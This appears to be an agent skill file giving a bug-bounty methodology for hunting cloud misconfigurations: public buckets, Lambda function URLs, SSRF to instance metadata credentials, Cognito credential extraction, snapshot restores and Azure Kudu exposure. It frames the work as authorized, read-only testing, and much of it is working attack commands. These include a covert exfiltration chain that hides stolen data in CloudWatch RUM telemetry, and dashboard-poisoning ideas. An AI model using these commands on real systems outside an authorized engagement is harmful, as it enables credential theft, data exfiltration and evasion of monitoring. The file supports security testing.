---
name: hunt-cloud-misconfig
description: "Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services)."
---

# HUNT-CLOUD-MISCONFIG — Cloud / Infrastructure Misconfiguration

## Core Methodology

Cloud-native storage and compute misconfig is mostly a recon-and-validate discipline: enumerate exposed buckets/services with targeted dorking and permutation wordlists, pull credentials out of client-side JS bundles, reach the instance metadata service through an SSRF bridge, then **prove a real read/write/RCE** rather than reporting a status code. The four anchor surfaces below cover the common cases; the CloudWatch RUM appendix is a worked deep-dive on the highest-value modern variant (unauthenticated Cognito-credential leakage via an embedded SDK).

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---

## Validation & False-Positives (Gate 0)

**Authorized-engagement rule:** every technique below is a recon-and-*validate* discipline run against assets that are explicitly in the engagement scope/SoW. Confirm the asset (bucket, function URL, snapshot, distribution, storage account, registry) belongs to the target account before touching it — cloud names are guessable and you will otherwise hit a stranger's tenant. Run `/scope` / `tools/scope_checker.py` first. All PoCs are **read-only**: prove access, never mutate or delete. Cloud API calls are logged in CloudTrail / Azure Activity Log / GCP Audit Logs — pair with `mid-engagement-ir-detection` and expect the client to see every call.

Kill these before they waste a report slot:

- **A status code is not a finding.** `200` on a bucket root, a Lambda function URL, or a CloudFront path proves reachability, not misconfiguration. Prove the *sensitive* read/write/RCE.
- **Public-by-design ≠ vulnerable.** Static-asset buckets, public ECR "public gallery" repos, community AMIs, and CloudFront-fronted marketing sites are *intended* to be public. The bug is unintended data/compute exposure, not "it responded."
- **Shared-tenant false owner.** A guessed name (`prod-backups`, `company-data`) may resolve to an unrelated account. Cross-check the `x-amz-bucket-region`/account-ID, ARN, or distribution owner against known target infrastructure before claiming it.
- **Signed-URL / expiry artifacts.** A snapshot or object that "loads" via a presigned URL you were handed is not "public." Re-fetch from a **clean, unauthenticated session** (no env creds, no cookies, `--no-sign-request`) — this is the Unique-Marker / clean-session gate from `triage-validation`.
- **Region/AZ mismatch = no bug.** Public RDS/EBS snapshots are only exploitable if *you* can restore them in *your* account; a snapshot marked public but encrypted with a non-shared CMK cannot be restored → Informational.
- **WAF/edge 403 masquerade.** A CloudFront/origin 403 may be edge policy, not the origin. Confirm the origin itself answers before reporting an "origin bypass."

If the finding survives Gate 0, capture the clean-session command, the response proving sensitive access, and `aws sts get-caller-identity` (or the cloud equivalent) in the PoC.

---

## Lambda Function-URL Abuse + SSRF-to-IMDS

Lambda **function URLs** (`https://<url-id>.lambda-url.<region>.on.aws/`, GA April 2022) expose a function directly over HTTPS with an `AuthType` of either `AWS_IAM` or **`NONE`**. `AuthType: NONE` means anyone on the internet invokes the function unauthenticated — this is the single most common serverless-exposure bug in 2024-2026 programs. Function URLs also appear behind API Gateway, AppSync resolvers, and CloudFront origins, so treat any `*.on.aws` or `execute-api` host as an invocation surface.

### Detection

```bash
# Harvest function-URL hosts from JS bundles / HTML / recon output
grep -ErohE "https://[a-z0-9]{32}\.lambda-url\.[a-z0-9-]+\.on\.aws[A-Za-z0-9/_.-]*" .
grep -ErohE "https://[a-z0-9]+\.execute-api\.[a-z0-9-]+\.amazonaws\.com/[A-Za-z0-9/_-]*" .

# `tools/sourcemap_analyzer.py` (/js-analyze) recovers these from minified SPA chunks;
# `tools/cloud_recon.sh` + Wayback CDX surface historical on.aws hosts.

# Unauthenticated invoke probe (AuthType: NONE if this returns application output, not 403)
curl -s -i "https://<url-id>.lambda-url.us-east-1.on.aws/"
curl -s -i -X POST "https://<url-id>.lambda-url.us-east-1.on.aws/" \
  -H 'content-type: application/json' -d '{"ping":"1"}'
```

### The two real bugs

1. **Unauthenticated invocation of a sensitive function** — the function reads a database, returns secrets, or performs a privileged action, and `AuthType` is `NONE`. Enumerate the handler's routing/params (many are thin Express/Flask shims) with `/param-discover` (`tools/param_discovery.sh`) to reach hidden actions.
2. **SSRF *inside* the function → IMDS → the function's execution-role credentials.** Lambda has no EC2 IMDS, but it injects the role's creds into env vars **and** exposes the Lambda Runtime API + a credentials endpoint. If the function fetches an attacker-controlled URL, or reflects one, you pivot to its role:

```bash
# If the function proxies/fetches a user-supplied URL, point it at the runtime creds:
#   env-var path (SSRF that can read env / stack traces):
#     AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN are in os.environ
#   Lambda credential relay (older/container images may still reach 169.254.169.254):
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # only if on VPC/EC2-backed
# Confirm and hand off:
aws sts get-caller-identity
```

Once you hold the execution role's STS creds, permission analysis and escalation are **owned by `cloud-iam-deep`** — do not re-derive the privesc tables here; hand the role over. Grounding: `AuthType: NONE` misconfigurations map to the same class as the widely reported **Capital One SSRF-to-IMDS breach (2019)** where a WAF SSRF reached the instance role; the serverless variant substitutes the Lambda execution role for the instance role.

### Severity

| Finding | Severity |
|---|---|
| `AuthType: NONE` function URL that returns secrets / DB rows / performs privileged writes | Critical–High (by data/action) |
| SSRF in a function → execution-role STS creds with broad IAM | Critical (hand to `cloud-iam-deep`) |
| `AuthType: NONE` function URL that is a genuinely public, read-only, non-sensitive endpoint | Informational (Gate 0) |

## Public RDS / EBS Snapshot Exposure

An RDS or EBS snapshot can be shared with **"all AWS accounts"** (public). A public **RDS** snapshot lets any account restore a full copy of the production database into *their* account; a public **EBS** snapshot exposes disk contents (often containing `.env`, keys, source, PII). This is a mass-data-breach primitive and appears constantly in misconfigured backup automation.

### Detection & read-only validation

```bash
# Enumerate snapshots publicly shared by the target account (needs any valid creds in YOUR account):
aws rds describe-db-snapshots --include-public \
  --snapshot-type public --region us-east-1 \
  --query "DBSnapshots[?contains(DBSnapshotArn,'<target-account-id>')]"

aws ec2 describe-snapshots --restorable-by-user-ids all \
  --owner-ids <target-account-id> --region us-east-1 \
  --query "Snapshots[].[SnapshotId,VolumeSize,Description,Encrypted]"

# Read-only PoC — restore into YOUR sandbox account, never touch theirs:
#   EBS: create a volume from the public snapshot, attach to a throwaway instance, mount read-only.
aws ec2 create-volume --snapshot-id snap-XXXX --availability-zone us-east-1a
#   RDS: restore to a t3.micro in your account, then read (do NOT connect to the target's live DB).
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier poc-restore --db-snapshot-identifier <public-snap-arn>
```

**Gate 0 for snapshots:** an *encrypted* snapshot shared publicly is not exploitable unless the KMS CMK was **also** shared — otherwise the restore fails and the finding is Informational. Always confirm you can actually mount/query the restored copy before reporting, and delete your sandbox restore afterward (note it in cleanup). Grounding: public-snapshot exposure is a recurring class; AWS added the **"Block Public Access for EBS snapshots"** control (2023) precisely because of it, and public RDS snapshots have driven multiple disclosed data-leak reports.

## CloudFront / Origin Bypass

CloudFront (or any CDN edge) enforces WAF rules, geo/path restrictions, and auth at the *edge*. If the **origin** (an S3 bucket, ALB, EC2, or custom host) is directly reachable, an attacker bypasses every edge control by talking to the origin IP/host directly.

### Detection & validation

```bash
# 1. Find the true origin: DNS history / Censys / Shodan for the origin behind the CF distribution.
#    UBH: `tools/cloud_recon.sh --keyword <name>` runs CloudFail (origin IP via DNS history).
#    Confirm the distribution -> origin mapping (Xcache / Via / X-Amz-Cf-Id headers reveal CloudFront).

# 2. Origin-bypass test: request a WAF/geo/auth-blocked path at the edge vs at the origin directly.
curl -s -i "https://cdn.target.com/admin"                        # edge: expect 403 / WAF block
curl -s -i -H 'Host: cdn.target.com' "https://<origin-ip>/admin" # origin: if 200, edge is bypassed

# 3. S3-origin OAC/OAI bypass: if the CF origin is an S3 bucket, is the bucket ALSO directly public?
curl -s -i "https://<origin-bucket>.s3.<region>.amazonaws.com/<key-served-only-via-cdn>"
```

The bug is: edge control (WAF, signed URLs, geo-block, path-based auth) is enforced only at CloudFront while the origin answers the same request unauthenticated. Common variants: S3 origin without an Origin Access Control so the bucket is world-readable; an ALB/EC2 origin with a public IP and no `CloudFront-Managed-Prefix-List` restriction; **Host-header / `X-Forwarded-Host` confusion** where the origin trusts the edge-supplied host. Cross-reference `hunt-ssrf` for header-based origin reach and the `hunt-subdomain` stale-CNAME angle when the origin is a deleted bucket.

**Gate 0:** a 403 at the edge may just be edge policy — confirm the origin *itself* returns the protected resource before claiming a bypass, and confirm the origin IP belongs to the target (not a shared CDN node).

## Azure Function-App / Storage Misconfig

Azure's serverless + storage layer mirrors the AWS bugs with Azure-specific primitives.

### Function App

```bash
# Function host is <app>.azurewebsites.net; the master/function keys authorize invocation.
# Anonymous-authLevel functions invoke with no key:
curl -s -i "https://<app>.azurewebsites.net/api/<function>?name=test"

# Kudu/SCM debug console (source + app settings incl. connection strings) — should NOT be public:
curl -s -i "https://<app>.scm.azurewebsites.net/api/vfs/site/wwwroot/"
```

The high-value paths: an **anonymous `authLevel`** function performing privileged work; an exposed **Kudu/SCM** console leaking `local.settings.json` / app-setting connection strings; and a Function App with a **System-Assigned Managed Identity** — if you reach SSRF/RCE inside the function, the MI token endpoint (`http://169.254.169.254/metadata/identity/oauth2/token`, `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` env vars) yields an Azure AD token. Token abuse and Azure RBAC privesc are **owned by `cloud-iam-deep`** → Azure Managed Identity section — hand the token there, don't duplicate.

### Storage (Blob)

```bash
# Public container listing (anonymous):
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"
# Public blob read:
curl -s -i "https://<account>.blob.core.windows.net/<container>/<blob>"
# UBH: `tools/cloud_recon.sh` runs cloud_enum across AWS/Azure/GCP to surface public accounts/containers.
```

**Gate 0:** distinguish an *intentionally* public `$web` static-site container from a data container. A leaked SAS token with an expiry in the past is not a finding; re-validate it live from a clean session. Grounding: over-permissive public-blob and leaked-SAS exposure is a repeatedly disclosed Azure class; the **ChaosDB (2021, Wiz)** and **BlobLeak-style** research established public/over-shared storage as a first-class breach vector.

## Public ECR / AMI

Compute images are code+config supply — a public one leaks internals or lets an attacker stage a poisoned image.

```bash
# Public ECR (Amazon ECR Public Gallery) — anonymous pull:
aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws
docker pull public.ecr.aws/<registry-alias>/<repo>:<tag>
# Inspect layers for secrets / .env / internal source:
docker save public.ecr.aws/<registry-alias>/<repo>:latest -o img.tar && tar -xf img.tar
grep -rEi 'AKIA[0-9A-Z]{16}|secret|password|private_key' extracted-layers/   # feed to tools/secrets_hunter.sh

# Public AMI shared by the target account — launch in YOUR account, inspect the disk read-only:
aws ec2 describe-images --owners <target-account-id> --executable-users all \
  --query "Images[].[ImageId,Name,Description]" --region us-east-1
```

The bugs: a **public ECR repo** whose image layers contain baked-in credentials, internal source, or `.env` files; a **public/shared AMI** that ships a snapshot with secrets or a pre-configured admin instance profile. Any credential recovered here is handed to `cloud-iam-deep`; container-runtime escape and in-cluster image trust are **owned by `hunt-k8s`** — do not re-derive escape technique here.

**Gate 0:** the ECR *Public Gallery* is an intentionally public distribution channel — the finding is *unintended* secret/internal-source exposure inside the layers, not the repo's public-ness. For AMIs, confirm you can actually launch/mount it (encrypted-without-shared-CMK → Informational). Grounding: baked-in secrets in shared images map to the widely disclosed container-layer secret-leak class (Dockerfile `COPY .env`, embedded cloud keys) and AWS's own guidance against publishing AMIs with attached instance credentials.

---

## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---

## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### Regex set for recon

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.

**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.

**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS).

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |

### Disclosed cases / authoritative writeups

No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is "Cognito identity pool over-permission via embedded SDK" — RUM is one common embedding.

- **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
- **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. This skill *finds* the credential (public bucket, Lambda execution role via SSRF, Cognito unauth role, Azure MI token, ECR/AMI-baked key); `cloud-iam-deep` owns **all post-credential permission analysis and privilege-escalation tables** (AWS/Azure/GCP/K8s privesc, STS/AssumeRole chaining, Cognito GetId→GetCredentials chain). Hand the credential over — do NOT re-derive privesc here. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-k8s`** — Owns all Kubernetes/Docker exposure and container-runtime escape (API `6443`, kubelet `10250`, etcd `2379`, docker.sock, runc/Leaky Vessels, RBAC/SA-token abuse). When a public ECR/AMI image or a cloud-hosted function pivots into containerized infra, hand off to `hunt-k8s` for cluster/escape technique — do NOT duplicate container-escape steps here. Chain primitive: Public ECR image with baked K8s SA token → `hunt-k8s` in-cluster enumeration → node/proxy RCE.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.
